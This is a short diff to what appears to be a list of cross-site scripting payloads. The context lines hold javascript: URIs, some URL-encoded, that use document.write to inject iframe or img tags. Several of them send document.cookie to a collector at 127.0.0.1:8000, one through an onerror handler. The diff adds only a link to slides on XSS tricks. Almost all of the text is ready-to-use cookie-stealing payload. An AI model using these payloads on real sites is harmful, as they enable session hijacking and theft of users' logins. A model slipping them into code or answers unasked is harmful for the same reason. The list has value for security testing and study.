@@ -40,3 +40,6 @@ javascript:document.write='<iframe src=https://js13kgames.com/games/onoff/index.
 %09javascript:document.write%3d%27%253cimg%20src=%22http://127.0.0.1:8000?cookie=%27%20%2b%20document.cookie%20%2b%20%27%22%20/%253e%27
 %09javascript:document.write='<img src="http://127.0.0.1:8000?cookie=' %2b document.cookie %2b '" />'
 %09javascript:document.write='<img src=x onerror=this.src='http://127.0.0.1:8000/?c='%2bdocument.cookie'" />'
+
+More:
+https://www.slideshare.net/GarethHeyes/xss-magic-tricks?fbclid=IwAR1DZL2fu-3UGTUyUJnleAP0CFhN_1TuFZCwVH0acEx8QEvABrtacVg_bCE
